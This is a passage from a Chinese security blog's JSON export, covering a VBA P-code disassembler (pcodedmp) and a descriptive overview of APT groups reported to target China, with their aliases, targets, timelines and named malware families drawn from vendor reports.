Execodes。当P-code至少执行了一次后，它的另一种标记形式将存储在文档中的其他位置（在流中，其名称以开头__SRP_，后跟数字）。从那里可以更快地执行它。但是，execode的格式非常复杂，并且特定于创建它们的特定Office版本（不是VBA版本）。这使得它们极不可携带。此外，它们的存在不是必需的-可以将它们删除，并且宏将运行正常（从P-code开始）。 由于大多数情况下，由P-code决定宏将执行的操作（即使既没有源代码也没有execode）都存在，因此拥有一个可以显示宏的工具是很有意义的。这就是促使我们创建此VBA P-code反汇编程序的原因。 安装 1pip install pcodedmp -U 使用方法： 该脚本将一个或多个文件或目录名称的列表作为命令行参数。如果名称是OLE2文档，则将检查该文档中的VBA代码，并且将反汇编每个代码模块的P-code。如果名称是目录，则将对该目录及其子目录中的所有文件进行类似的处理。除了反汇编的P-code外，默认情况下，脚本还显示dir流的已解析记录，以及VBA模块中使用并存储在_VBA_PROJECT流中的标识符（变量名和函数名）。 该脚本支持VBA5（Office 97，MacOffice 98），VBA6（Office 2000至Office 2009）和VBA7（Office 2010及更高版本）。 命令行选项： -h，--help 显示简短说明如何使用脚本以及什么是命令行选项。 -v，--version显示脚本的版本。 -n，--norecurse如果在命令行上指定的名称是目录，则仅处理该目录中的文件；否则，将不执行任何操作。不要在其子目录中处理文件。 -d，--disasmonly只有P-code会被反汇编，而无需解析dir流的内容或流中的标识符_VBA_PROJECT。 -b，和流--verbose的内容以十六进制和ASCII格式转储。此外，每个编译为P-code VBA行的原始字节也都以十六进制和ASCII转储。dir_VBA_PROJECT -o OUTFILE，--output OUTFILE将结果保存到指定的输出文件，而不是将其发送到标准输出。 6. 参考链接 Word、Excel 和 PowerPoint 的文件格式参考 海莲花团伙对中南半岛国家攻击活动的总结：目标、手法及技术演进 宏病毒的研究与实例分析01——基础篇 宏病毒的研究与实例分析02——复合文档格式分析 宏病毒的研究与实例分析05——无宏文件携带宏病毒 宏病毒的研究与实例分析06——终结篇 进击的MACRO Office文件格式基础知识（1） VBA Stomping 简介 oledump.py","categories":[{"name":"逆向","slug":"逆向","permalink":"http://wayoka.github.io/categories/%E9%80%86%E5%90%91/"},{"name":"宏病毒","slug":"逆向/宏病毒","permalink":"http://wayoka.github.io/categories/%E9%80%86%E5%90%91/%E5%AE%8F%E7%97%85%E6%AF%92/"},{"name":"知识积累","slug":"逆向/宏病毒/知识积累","permalink":"http://wayoka.github.io/categories/%E9%80%86%E5%90%91/%E5%AE%8F%E7%97%85%E6%AF%92/%E7%9F%A5%E8%AF%86%E7%A7%AF%E7%B4%AF/"},{"name":"网络安全","slug":"逆向/宏病毒/知识积累/网络安全","permalink":"http://wayoka.github.io/categories/%E9%80%86%E5%90%91/%E5%AE%8F%E7%97%85%E6%AF%92/%E7%9F%A5%E8%AF%86%E7%A7%AF%E7%B4%AF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"宏","slug":"宏","permalink":"http://wayoka.github.io/tags/%E5%AE%8F/"},{"name":"宏病毒","slug":"宏病毒","permalink":"http://wayoka.github.io/tags/%E5%AE%8F%E7%97%85%E6%AF%92/"},{"name":"word","slug":"word","permalink":"http://wayoka.github.io/tags/word/"},{"name":"逆向","slug":"逆向","permalink":"http://wayoka.github.io/tags/%E9%80%86%E5%90%91/"},{"name":"知识积累","slug":"知识积累","permalink":"http://wayoka.github.io/tags/%E7%9F%A5%E8%AF%86%E7%A7%AF%E7%B4%AF/"}]},{"title":"对华APT组织整理","slug":"对华APT整理","date":"2020-10-27T05:04:48.000Z","updated":"2021-10-29T09:08:03.653Z","comments":true,"path":"2020/10/27/对华APT整理/","link":"","permalink":"http://wayoka.github.io/2020/10/27/%E5%AF%B9%E5%8D%8EAPT%E6%95%B4%E7%90%86/","excerpt":"1. APT概述 APT是英文advanced persistent threat，直译为高级持续威胁，也称高级持续性威胁，先进持续性威胁等。 APT攻击指高级可持续性攻击，一般是针对政府、军队、教育、大型公共设施如电力、水利等的攻击，通常是由有国家背景的组织或资金实力雄厚的团伙发起的攻击，这些攻击带有强烈的目的性，有些带有明显的政治意图，这些发起攻击的组织和团伙我们一般称之为APT组织。 APT组织指有能力且已经针对特定机构发起有针对性意图的攻击的组织或团伙，大部分APT组织背后都有深厚的政府背景，不会因为安全厂商的披露而停止攻击活动，大部分攻击者在攻击活动被暴露后会改头换面、更新自己的","text":"1. APT概述&emsp;APT是英文advanced persistent threat，直译为高级持续威胁，也称高级持续性威胁，先进持续性威胁等。 &emsp;APT攻击指高级可持续性攻击，一般是针对政府、军队、教育、大型公共设施如电力、水利等的攻击，通常是由有国家背景的组织或资金实力雄厚的团伙发起的攻击，这些攻击带有强烈的目的性，有些带有明显的政治意图，这些发起攻击的组织和团伙我们一般称之为APT组织。 &emsp;APT组织指有能力且已经针对特定机构发起有针对性意图的攻击的组织或团伙，大部分APT组织背后都有深厚的政府背景，不会因为安全厂商的披露而停止攻击活动，大部分攻击者在攻击活动被暴露后会改头换面、更新自己的武器库后从新发起新一轮的网络攻击；其一般具有以下特点： 攻击目标明确：APT组织攻击的对象一般为政府、军队、教育、科研单位和高校等； 攻击目的明确：APT组织的攻击目的一般为信息盗窃和间谍活动，窃取政府、军队、科研单位等国家重要文件；为了经济利益窃取商业机密；破坏大型公共设施； 攻击方式高级：APT组织拥有独立的武器库，会使用0 day/1 day/n day等漏洞攻击，注重动态行为和静态文件的隐蔽性，例如通过隐蔽通道、加密通道避免网络行为被检测，或者通过伪造合法签名的方式避免恶意代码文件本身被识别，攻击的各个阶段都不易被发现，即使被发现也很难追踪； 攻击持续时间长：APT攻击分为多个步骤，从最初的信息搜集，到信息窃取并外传往往要经历几个月甚至更长的时间；如有资料显示震网病毒从2006年开始，到2010年被发现，用几年的时间对伊朗的核设施进行打击； 攻击行为特征难以提取：APT普遍采用漏洞获取权限、通过木马进行远程控制，木马网络通信加密，通信域名或IP一旦暴露立即放弃，而且现在攻击者越来越多的使用公开框架的后门木马作为持续控制手段，这让APT追踪变得更加困难。 2. APT攻击态势 中国仍然是APT攻击的主要受害国，受到来自于东亚、东南亚、南亚、欧美等各个区域的网络威胁； 网络攻击形势跟地域政治局势有相当密切的关联，地域安全形势复杂的地区，往往是APT攻击最为严重和复杂的地区； 多平台的攻击能力已经成为大量APT攻击者组织的标配能力； 0day依然是最有效的攻击工具，一些组织依然不计成本来购买会自己挖掘0day来进行攻击。 从时间上看，从2015年到2019年，关于APT的报告数量不断增加，说明APT组织活动日渐活跃，同时也说明各大安全厂商越来越重视APT带来的威胁。 3. 中国面临的APT威胁&emsp;中国历来都是APT攻击的主要受害国，随着中国经济的快速发展，以及国际地位的不断攀升，中国面临的外部威胁形势更加严峻。 &emsp;下表中列出了一些被安全厂商披露的APT组织。 组织名称(命名单位) 组织归属 主要攻击手段 攻击对象 最早活动时间 DarkHotel(Kaspersky) 黑店APT-C-06 (360)SIG25 (NSA)Dubnium (Microsoft)Fallout Team (FireEye)Shadow Crane (CrowdStrike) 朝鲜半岛疑似韩国 鱼叉攻击、网络劫持 国防工业、政府、非政府、工业、制药公司，医疗、军事、能源 2010年 Higaisa 黑格莎 朝鲜 鱼叉攻击 政府、外交等 2016年 Reaper (FireEye) APT37 (Mandiant)Ricochet Chollima (CrowdStrike) Group123 (Talos)Red Eyes (AhnLab)Venus 121 (ESRC) 朝鲜 鱼叉攻击、漏洞利用 航空，汽车，化工，金融，政府，医疗，制造业等 2012年 Lazarus(Kaspersky) Labyrinth Chollima (CrowdStrike)Group 77 (Talos)Hastati Group (SecureWorks)Whois Hacking Team (McAfee)NewRomanic Cyber Army Team (McAfee)Zinc (Microsoft)Hidden Cobra (Trend Micro)Nickel Academy (SecureWorks)APT-C-26 (360) 朝鲜 国家赞助 工业，金融，政府等 2007年 毒云藤(360) 穷奇 绿斑 Green Spot(安天) APT-C-01 中国台湾 鱼叉攻击 政府、科研相关行业 2007年 海莲花(360)APT32(Mandiant)OceanLotus (360)SeaLotusAPT-C-00 (360)Ocean Buffalo (CrowdStrike) 越南 鱼叉攻击、水坑攻击、漏洞利用 中国政府的海事机构、海域建设部门、科研院所和航运企业 2012年 蔓灵花BITTERT-APT-17 印度 鱼叉攻击 政府、军工业、电力、核等单位 2013年 Patchwork(Cymmetria) Dropping Elephant (Kaspersky)Chinastrats (Kaspersky)APT-C-09 (360)Monsoon (Forcepoint)Quilted Tiger (CrowdStrike) 印度 鱼叉攻击、水坑攻击、漏洞利用 航空，国防，能源，金融，政府，IT，非政府组织 2009年 Sidewinder响尾蛇T-APT-04 印度 鱼叉攻击、水坑攻击、漏洞利用 政府、军工、军事 2012年 Turla(Kaspersky)SnakeUroburosWhiteBearWaterbug (Symantec)Venomous Bear (CrowdStrike)Group 88 (Talos)SIG23 (NSA)Iron Hunter (SecureWorks)Pacifier APT (Bitdefender) 俄罗斯 鱼叉攻击、水坑攻击、漏洞利用 政府机构，使馆，教育，研究和制药公司等 2011年 DonotAPT-C-35 肚脑虫 疑似具有南亚背景 鱼叉攻击、水坑攻击、漏洞利用 政府机构 2018年 蓝宝菇APT-C-12 中国台湾 鱼叉攻击 政府、科研、军事 2011年 4.各个对华APT组织简介4.1 DarkHotel&emsp;DarkHotel(Kaspersky)，也被称为 黑店、APT-C-06 (360)、SIG25 (NSA)、Dubnium (Microsoft)、Fallout Team (FireEye)、Shadow Crane (CrowdStrike)等。该组织于2014年11月首次在Kaspersky的报告中出现，一些研究者认为该组织与朝鲜半岛(疑似韩国)有非常大的关系。 &emsp;该组织使用鱼叉攻击、水坑攻击、0day漏洞等方式对目标发起攻击；他们的攻击国家包括俄罗斯，韩国，日本，孟加拉国，泰国，台湾，中国，美国，印度，莫桑比克，印度尼西亚和德国；攻击目标是来自国防、政府、军事、工业等行业的工作人员，主要以政治人物为目标。 &emsp;该组织的一大特色是喜欢把木马隐藏在开源的代码中进行伪装，如putty、openssl、zlib等，把少量木马代码隐藏在大量的开源代码中，从而实现躲避检测的目的，因此将被称为“寄生兽”。 攻击时间线 2010： 目标：来自在亚太地区开展业务的公司和来自外包行业的高层管理人员，包括首席执行官，高级副总裁，销售和营销总监和高级研发人员； 方法：利用 Flash 0day漏洞利用、鱼叉攻击等攻击方式，使用酒店网络来追踪选定目标； 2015年： 2015年的攻击目标中没有出现中国，详细报告参见《Darkhotel’s attacks in 2015》，在2015年，DarkHotel依然主要依靠渗透酒店WIFI系统入侵目标计算机，但其实用的恶意文件由.hta扩展到了.rar; 2015年12月发起“破晓”行动，使用CVE-2015-8651 0day漏洞对目标发起攻击； 2016年： 2016年9月，DorkHotel发起了“ Inexsmar”行动 目标：似乎用于针对政治人物的运动； 方法：此攻击使用新的有效载荷传递机制，而不是经常使用的0day漏洞利用，将社会工程与相对复杂的木马融合在一起，以感染其选定的受害者；详细报告参见《Inexsmar: An unusual DarkHotel campaign》 &emsp;在这里查看DarkHotel更多信息。 4.2 黑格莎(Higaisa)&emsp;黑格莎，又称“Higaisa”，源于作者喜欢使用的RC4的解密密钥为“Higaisakora”，取Higaisa的英译，该组织和DarkHotel之间似乎存在一些关联。 &emsp;该组织的攻击活动至少可以追溯到2016年，一直持续活跃到现在。该组织常利用节假日、朝鲜国庆等朝鲜重要时间节点来进行钓鱼活动，诱饵内容包括新年祝福、元宵祝福、朝鲜国庆祝福，以及重要新闻、海外人员联系录等等。 &emsp;该攻击组织不仅拥有攻击目标PC终端设备的能力，有报告表明此组织还拥有对移动端的攻击能力。被攻击的对象包括跟朝鲜相关的外交实体（如驻各地大使馆官员）、政府官员、人权组织、朝鲜海外居民、贸易往来人员等。目前监测到的受害国家包括中国、朝鲜、日本、尼泊尔、新加坡、俄罗斯、波兰、瑞士等。 4.3 Reaper&emsp;Reaper APT组织最早由Fireeye发现并公布，以APT组织谁先发现谁拥有命名权的原则，Reaper由Fireeye命名，后由于其多变的攻击方式，又有多个安全厂商对其“起别名”，该组织目前拥有的名字(命名单位)：Reaper (FireEye)、APT37 (Mandiant)、Ricochet Chollima (CrowdStrike)、Group123 (Talos)、Red Eyes(AhnLab)、Venus 121(ESRC)，国内更喜欢称其为 Group123 或 APT37。 &emsp;该组织是一个很可能来自朝鲜的黑客组织。专家推测，APT37可能直接由朝鲜政府资助。直到2017年，APT37几乎将所有精力集中在位于韩国的目标上。但是，在2017年，黑客组织开始扩大影响范围，并开始在日本和越南等东亚其他州发起活动。 APT37的目标也位于中东。黑客组织还与其他思想不端的演员合作。 &emsp;该组织旨在促进朝鲜的利益，其一般采用水坑攻击，鱼叉攻击，使用各种社交工程技术来诱骗用户下载并执行损坏的文件等手段攻击指定目标。 &emsp;该组织在过去实施的攻击活动中主要以情报窃取为意图，并呈现出一些其特有的战术技术特点，包括： 同时拥有对 PC（Windows） 和 Android 终端的攻击武器； 对韩国网站实施入侵并作为攻击载荷分发和控制回传渠道，或者使用云盘，如 Yandex、Dropbox 等作为攻击载荷分发和控制回传渠道； 使用 HWP 漏 洞对韩国目标人员实施鱼叉攻击。 APT37工具集 APT37工具集 NavRAT，一种RAT或远程访问木马，其中包含许多功能。 CORALDECK，一种用于从受感染主机中收集文件的威胁。 Karae是一种后门特洛伊木马，它收集有关主机系统的数据，并使攻击者能够确定如何进行攻击。 DOGCALL，一种后门特洛伊木马，由于其功能而类似于RAT。 ROKRAT ，一种可以记录音频，劫持登录凭证，执行远程命令等的RAT。 ScarCruft Bluetooth Harvester，基于Android的威胁，用于从受感染设备中收集信息。 GELCAPSULE，一种木马，用于在受感染的系统上植入其他恶意软件。 MILKDRO，一个后门，它可以篡改Windows注册表来获得持久性并且非常安静地运行。 SHUTTERSPEED，一种后门特洛伊木马，可以获取屏幕快照，虹吸有关主机软件和硬件的信息，并在系统上部署其他恶意软件。 RICECURRY，一段用JavaScript编写的代码，被注入到被劫持的网站中，用于检查访问该页面的用户的指纹，以确定攻击者是否应该执行恶意软件。 SLOWDRIFT，木马下载器。 RUHAPPY，一种磁盘擦除器，利用用户硬盘的MBR（主引导记录）。 ZUMKONG，与Google Chrome和Internet Explorer Web浏览器兼容的信息窃取者。 SOUNDWAVE，一种工具，能够记录音频（通过系统上存在的麦克风），然后将记录发送到攻击者的C＆C（命令与控制）服务器。 时间线 2012年： 攻击韩国特定目标； 2016年 2016年，Erebus计划；详情见《Erebus Linux Ransomware: Impact to Servers and Countermeasures》; 2016年2月，Daybreak行动，使用两个0day漏洞攻击(Adobe Flash Player、CVE-2016-0147)攻击高知名度成员；详情见《Operation Daybreak Flash zero-day exploit deployed by the ScarCruft APT Group》; 2016年8月， Golden Time计划使用钓鱼邮件攻击韩国用户； 2016年11月，Evil New Year计划钓鱼邮件攻击韩国用户； 2017年 2017年2月，Are You Happy?计划攻击韩国用户，破坏目标用户的计算机系统； 2017年5月，FreeMilk计划使用恶意的带宏文档对几家非韩国金融机构进行攻击；详见《FreeMilk: A Highly Targeted Spear Phishing Campaign》; 2017年11月，North Korean Human Right计划使用鱼叉攻击对韩国特定用户发起攻击； 2017年12月，Fractured Block计划；详见《The Fractured Block Campaign: CARROTBAT Used to Deliver Malware Targeting Southeast Asia》 2018年 2018年1月，Evil New Year计划使用鱼叉攻击攻击韩国用户； 2018年2月，Battle Cruiser；详见《‘오퍼레이션 배틀 크루저’ 다양한 취약점으로 국내외 APT 공격 지속》; 2018年4月Star Cruiser行动；详见《국가기반 APT 그룹 ‘오퍼레이션 스타 크루저(Operation Star Cruiser)’ 수행 … 사이버 첩보활동 지》 2018年5月，Onezero行动； 2018年8月，Rocket Man行动； 2018年11月，Korean Sword行动； 2019年 2019年1月，Holiday Wiper行动； 2019年2月，Golden Bird行动和High Expert行动； 2019年4月，Black Banner行动； 2019年5月，Golden Bird行动；我们最近在该组织上发现了一些有趣的遥测技术，因此决定更深入地研究ScarCruft的近期活动。这表明该组织仍然非常活跃，并不断尝试完善其攻击工具。根据遥测技术，可以重新组装ScarCruft的二进制感染程序。它使用多阶段二进制感染来有效地更新每个模块并逃避检测。详见《ScarCruft continues to evolve, introduces Bluetooth harvester》 2019年7月，Fractured Statue行动；详见《The Fractured Statue Campaign: U.S. Government Agency Targeted in Spear-Phishing Attacks》 2019年9月，Dragon messenger行动；详见《Dragon messenger》 2020年 2020年2月，Spy Cloud行动；详见《The’Spy Cloud’ Operation:Geumseong121 group carries out the APT attack disguising the evidence of North Korean defection》 4.4 Lazarus&emsp;Lazarus组织别名：Lazarus Group *(Kaspersky)*、Labyrinth Chollima *(CrowdStrike)*、Group 77 *(Talos)*、Hastati Group *(SecureWorks)*、Whois Hacking Team *(McAfee)*、NewRomanic Cyber Army Team *(McAfee)*、Zinc *(Microsoft)*、Hidden Cobra *(Trend Micro)*、Nickel Academy *(SecureWorks)*、Appleworm *(?)*、APT-C-26 *(Qihoo 360)*、ATK 3 *(Thales)*、T-APT-15 *(Tencent)*、SectorA01 *(ThreatRecon)*、ITG03 (IBM) &emsp;有证据表明Lazarus组织隶属于朝鲜政府，是国家资助的网络组织，主要从事信息盗窃与间谍活动，网络破坏，金融犯罪等活动； &emsp;Malwarebytes Lazarus组织主要动机是获得经济收益，以此作为规避对该政权长期制裁的一种方法。他们在2013年利用DarkSeoul对一系列韩国广播公司和金融机构进行了一系列协同攻击，从而首次引起了媒体的关注； &emsp;2014年11月，Lazarus涉嫌违反Sony Pictures。这次攻击之所以引人注目，是因为它已广泛渗透到Sony网络中，导致大量数据被泄露。袭击的起因基本上是朦胧的，但联邦调查局发表了一份声明，将索尼的违规行为归咎于较早的《黑暗首尔》袭击，并将这两次事件均归因于朝鲜。 &emsp;2017年5月，WannaCry爆发，这是一种勒索软件，使用SMB漏洞作为攻击媒介。归因于WannaCry和先前的朝鲜攻击之间的代码重用主要归功于朝鲜，但是鉴于区域性威胁组之间共享工具的普遍做法，这被认为是薄弱的理由。西方情报机构向公众发布了正式声明，重申了这一归属。 &emsp;2018年9月6日，美国司法部指控一名朝鲜国民参与WannaCry和Sony的违规行为。 Lazarus组织的3个子组织： [Andariel, Silent Chollima](https://apt.thaicert.or.th/cgi-bin/showcard.cgi?g=Subgroup%3A Andariel%2C Silent Chollima) [BeagleBoyz](https://apt.thaicert.or.th/cgi-bin/showcard.cgi?g=Subgroup%3A BeagleBoyz) [Bluenoroff, APT 38, Stardust Chollima](https://apt.thaicert.or.th/cgi-bin/showcard.cgi?g=Subgroup%3A Bluenoroff%2C APT 38%2C Stardust Chollima) 除此之外，研究人员还发现一些和Lazarus有联系的组织：Covellite，[Reaper，APT 37，Ricochet Chollima，ScarCruft](https://apt.thaicert.or.th/cgi-bin/showcard.cgi?g=Reaper%2C APT 37%2C Ricochet Chollima%2C ScarCruft)和Wassonite。 &emsp;Lazarus组织使用的工具和发起的攻击都非常多，这里不一一赘述，详情参见《[APT group: Lazarus Group, Hidden Cobra, Labyrinth Chollima]([https://apt.thaicert.or.th/cgi-bin/showcard.cgi?g=Lazarus%20Group%2C%20Hidden%20Cobra%2C%20Labyrinth%20Chollima&amp;n=1](https://apt.thaicert.or.th/cgi-bin/showcard.cgi?g=Lazarus Group%2C Hidden Cobra%2C Labyrinth Chollima&amp;n=1))》 4.5 毒云藤&emsp;2007年，360追日团队发现毒云藤组织对中国国防、政府、科技、教育以及海事机构等重点单位和部门进行了长达11年的网络间谍活动。该组织主要关注军工、中美关系、两岸关系和海洋相关领域，其关注的领域与之前发布的海莲花（OceanLotus）APT组织有一定相似的地方。 &emsp;国内安天实验室于2018年9月19日发布APT攻击组织“绿斑”（Green Spot）分析报告。根据360威胁情报中心与安天实验室之间达成的能力型厂商成果互认约定，360威胁情报中心发现的“毒云藤”（APT-C-01）对应“绿斑”（Green Spot），二者是同一组织。 &emsp;该组织主要使用鱼叉攻击投放漏洞文档或二进制可执行文件;毒云藤组织主要使用的恶意木马包括Poison Ivy，ZxShell，XRAT 等，并使用动态域名，云盘，第三方博客作为其控制回传的基础设施。 毒云藤攻击事件时间线： 2007年12月，首次发现与该组织相关的木马。涉及海洋相关领域（疑似对某大型船务公司进行相关攻击）； 2008年3月，对国内某高校重点实验室（某科研机构）； 2009年2月，开始对军工行业展开攻击（某知名军工类期刊杂志社）； 2009年10月，木马增加了特殊的对抗静态扫描的手法（API字符串逆序），相关手法沿用到大部分版本的木马中，并持续应用到2018年； 2011年12月，木马增加了特殊的对抗动态检测的手法（错误API参数），相关手法沿用到大部分版本的木马中，并持续应用到2015年； 2012年2月，首次发现基于zxshell代码的修改版后门1，其中关键功能是窃取如.doc.ppt.xls.wps类文档文件 2013年3月，对中科院，以及若干科技、海事等领域国家部委、局等进行了集中攻击； 2013年10月，对中国某政府网站进行水坑攻击； 2014年5月，发现zxshell修改版后门1的进化版本，其中除了基于修改版1功能，增加了如“军”，“航”，“报告”关键字的搜索； 2014年9月12日，首次发现与CVE-2014-4114（0day漏洞）相关事件和样本； 2014年10月14日，iSIGHT发布相关报告，并指出CVE-2014-4114（0day漏洞）。同日微软发布相关安全公告； 2015年2月25日，对某军工领域协会组织（国防科技相关）、中国工程院等攻击，同时发现酷盘版样本； 2017年10月，主要通过CVE-2017-8759漏洞文档对某大型媒体机构网站和泉州某机关相关人员实施鱼叉攻击； 2018年4月，360威胁情报中心公开披露了该组织利用CVE-2017-8759漏洞文档的攻击恶意代码； 2018年5月，针对数家船舶重工企业、港口运营公司等海事行业机构发动攻击； 关于毒云藤的更多信息参见《APT 毒云藤(APT-C-01) 军政情报刺探揭露》 4.6 OceanLotus&emsp;”OceanLotus”（又名APT32、海莲花、SeaLotus 、APT-C-00），被认为是来自越南的APT攻击组织，自2012年活跃以来，一直针对中国大陆的敏感目标进行攻击活动，是近几年来针对中国大陆进行攻击活动最活跃的APT攻击组织，甚至没有之一。 &emsp;该组织的攻击目标众多且广泛，包括中国大陆的政府部门、海事机构、外交机构、大型国企、科研机构以及部分重要的私营企业等。并且有大量的国内目标被该组织攻击而整个内网都沦陷，且有大量的机密资料、企业服务器配置信息等被打包窃取。 &emsp;该组织攻击人员非常熟悉我国，对我国的时事、新闻热点、政府结构等都非常熟悉，如刚出个税改革时候，就立马使用个税改革方案做为攻击诱饵主题。此外钓鱼主题还包括绩效、薪酬、工作报告、总结报告等。 &emsp;海莲花使用的攻击战术和技术特点，包括使用开源的代码和公开的攻击工具，如Cobalt Strike。2018 年的攻击活动中使用了更加多样化的载荷投放形式，并使用多种白利用技术加载其恶意模块。 &emsp;有关海莲花APT组织2019年对中国大陆攻击情况的完整技术报告，请参考： &emsp;《“海莲花”(OceanLotus)2019年针对中国攻击活动汇总》 关于该组织的更多信息请参考：《[APT group: APT 32, OceanLotus, SeaLotus](https://apt.thaicert.or.th/cgi-bin/showcard.cgi?g=APT 32%2C OceanLotus%2C SeaLotus&amp;n=1)》 4.7 BITTER&emsp;蔓灵花（T-APT-17、BITTER）APT组织是一个长期针对中国、巴基斯坦等国家进行攻击活动的APT组织，该APT组织为目前活跃的针对境内目标进行攻击的境外APT组织之一。 &emsp;该组织主要针对政府、军工业、电力、核等单位进行攻击，窃取敏感资料，具有强烈的政治背景。该组织最早在2016由美国安全公司Forcepoint进行了披露，并且命名为BITTER，同年国内360也跟进发布了分析报告，命名为蔓灵花。 &emsp;该组织的名称的命名由来为，该组织的特马数据包头部以“BITTER”作为标识，因此命名为“BITTER”。但是值得注意的是，自从该活动被曝光后，该组织就修改了数据包结构，不再以“BITTER”作为数据包的标识，改为五字节的随机字符进行代替。 &emsp;蔓灵花组织主要使用鱼叉邮件向目标人员投放漏洞利用文档，其中包括针对Office 的漏洞文档和InPage 文字处理软件的漏洞文档（InPage 是一个专门针对乌尔都语使用者，即巴基斯坦国语设计的文字处理软件）。 &emsp;该组织主要使用鱼叉钓鱼进行攻击，投递伪装成word图标的自解压文件： &emsp;有证据显示，该组织跟“白象”（摩诃草、HangOver、Patchwork）也有千丝万缕的关系。 关于该组织的更多信息请参考：《APT group: Bitter》 4.8 Patchwork&emsp;Patchwork，也叫摩诃草、白象、HangOver，也是经常针对中国大陆进行攻击的组织，除了中国大陆的目标外，巴基斯坦也是该组织的主要目标。该组织的攻击活动以窃取敏感信息为主，最早可以追溯到2009年11月，至今还非常活跃。在针对中国地区的攻击中，该组织主要针对政府机构、科研教育领域进行攻击。该组织的常用特马包括badnews、qrat等。 &emsp;该组织使用的代码是从各种在线论坛上复制粘贴而成的；在活动的受害者系统中，Patchwork会立即搜索文档并将其上传到其C＆C，只有在目标被认为足够有价值时，才可以安装更高级的第二阶段恶意软件。 关于该组织的更多信息请参考：《[APT group: Patchwork, Dropping Elephant]([https://apt.thaicert.or.th/cgi-bin/showcard.cgi?g=Patchwork%2C%20Dropping%20Elephant&amp;n=1](https://apt.thaicert.or.th/cgi-bin/showcard.cgi?g=Patchwork%2C Dropping Elephant&amp;n=1))》 4.9 Sidewinder&emsp;响尾蛇(又称SideWinder，T-APT-04。Rattlesnake (Tencent))是一个背景可能来源于印度的 APT 组织，该组织此前已对巴基斯坦和东南亚各国发起过多次攻击， 该组织以窃取政府， 能源， 军事， 矿产等领域的机密信息为主要目的。 关于该组织的更多信息请参考：《蛇从暗黑中袭来——响尾蛇(SideWinder) APT组织2020年上半年活动总结报告》、《[APT group: SideWinder, Rattlesnake]([https://apt.thaicert.or.th/cgi-bin/showcard.cgi?g=SideWinder%2C%20Rattlesnake&amp;n=1](https://apt.thaicert.or.th/cgi-bin/showcard.cgi?g=SideWinder%2C Rattlesnake&amp;n=1))》 4.10 Turla&emsp;Turla又称为：Turla，Snake，Venomous Bear，VOOMOUS Bear，Group 88，Waterbug，WRAITH，Turla Team，Uroburos，Pfinet，TAG_0530，KRYPTON，Hippo Team，Pacifier APT，Popeye，SIG23，Iron Hunter，MAKERSMARK； &emsp;Turla是总部位于俄罗斯的威胁组织，该组织最早的网络活动可以追溯到1996年，自2004年以来已感染了超过45个国家的受害者，涉及政府，大使馆，军事，教育，研究和制药公司等多个行业。2015年中期，活动加剧。Turla以进行水坑和鱼叉式网络钓鱼活动以及利用内部工具和恶意软件而闻名。Turla的间谍平台主要用于Windows计算机，但也已被发现用于macOS和Linux计算机。 关于该组织的更多信息请参考：《Turla Group》、 《[APT group: Turla, Waterbug, Venomous Bear]([https://apt.thaicert.or.th/cgi-bin/showcard.cgi?g=Turla%2C%20Waterbug%2C%20Venomous%20Bear&amp;n=1](https://apt.thaicert.or.th/cgi-bin/showcard.cgi?g=Turla%2C Waterbug%2C Venomous Bear&amp;n=1))》 4.11 Donot&emsp;Donot“肚脑虫”（APT-C-35）是疑似具有南亚背景的APT组织，其主要以周边国家的政府机构为目标进行网络攻击活动，通常以窃取敏感信息为目的。该组织具备针对Windows与Android双平台的攻击能力。 &emsp;Donot APT组织利用恶意宏样本以及公式编辑漏洞利用样本对周边国家地区开展了多次攻击活动，同时，其在移动端攻击活动也并未停息。 &emsp;该组织使用了两种特定的攻击恶意框架，EHDevel 和 yty，命名取自恶意代码中的 PDB 路径信息。该组织使用的攻击载荷使用了多种语言开发，包括C++、.NET、Python、VBS 和AutoIt。 Donot此次的攻击活动有如下特点： RTF文档中嵌入Excel流，Excel流中包含恶意宏。 在文档单元格中写入长段语句，通过宏代码从语句特定位置获取字符拼接为恶意Payload远程服务器地址。 增加Loader模块，将恶意木马分割成为Loader以及加密数据两个模块，最终恶意木马由Loader解密数据模块释放执行，目前，Loader模块在VirusTotal上无杀软报毒。 在最新的攻击活动中，最终恶意木马不落地，在内存中解密执行，从而绕过杀软检测。 托管模板注入资源的恶意服务器上存在着多个测试样本。 关于该组织的更多信息请参考：《[APT group: Donot Team](https://apt.thaicert.or.th/cgi-bin/showcard.cgi?g=Donot Team&amp;n=1)》 4.12 蓝宝菇&emsp;从2011年开始持续至今，高级攻击组织蓝宝菇（APT-C-12）对我国政府、军工、科研、金融等重点单位和部门进行了持续的网络间谍活动。该组织主要关注核工业和科研等相关信息。被攻击目标主要集中在中国大陆境内。 &emsp;该组织主要关注核工业和科研等相关信息。被攻击目标主要集中在中国大陆境内。在2018 年中的高级持续性威胁报告中曾对该组织进行了介绍。蓝宝菇组织也主要使用鱼叉邮件实施攻击，其投放的文件主要是RLO伪装成文档的可执行文件或LNK 格式文件。 &emsp;该组织主要使用动态域名或IDC IP 最为其控制基础设施，后续也常使用AWSS3、新浪云等云服务作为其上传和托管窃取的数据。其常使用的恶意程序包括Poison Ivy、Bfnet，以及PowerShell 实现的后门。 &emsp;蓝宝菇和毒云藤两个组织从攻击来源来源来看，属于同一地域，但使用的TTP(策略技术流程)却存在一些差异。 蓝宝菇攻击事件时间线： 2011年3月，首次发现与该组织相关的木马，针对政府相关机构进行攻击。 2011年11月，对某核工业研究机构进行攻击。 2012年1月，对某大型科研机构进行攻击。 2012年3月，对某军事机构进行攻击。 2012年6月，对国内多所顶尖大学进行攻击。 2013年6月，对某中央直属机构进行攻击，同时开始使用新类型的RAT。 2014年8月，发现该组织使用5种以上的横向移动恶意代码针对重点目标机构进行大量横向移动攻击。 2014年12月，发现新的RAT，我们将其命名为Bfnet，该后门具备窃取指定扩展名文档等重要功能。 2015年9月，针对多个国家的华侨办事机构进行攻击。 2018年4月，针对国内某重要敏感金融机构发动鱼叉邮件攻击。 关于该组织的更多信息请参考：《蓝宝菇（APT-C-12）：核危机行动揭露》、《蓝宝菇(APT-C-12)最新攻击样本及C&amp;C机制分析》 参考链接 Threat Group Cards: A Threat Actor Encyclopedia 全球高级持续性威胁 (APT) 2019年研究报告 APT攻击组织”黑格莎（Higaisa）”攻击活动披露 Advanced Persistent Threat (APT) Threat Group Cards: A Threat Actor Encyclopedia APT 毒云藤(APT-C-01) 军政情报刺探揭露 “海莲花”(OceanLotus)2019年针对中国攻击活动汇总 蔓灵花（BITTER）APT组织针对中国境内军工、核能、政府等敏感机构的最新攻击活动报告 蛇从暗黑中袭来——响尾蛇(SideWinder) APT组织2020年上半年活动总结报告 Donot 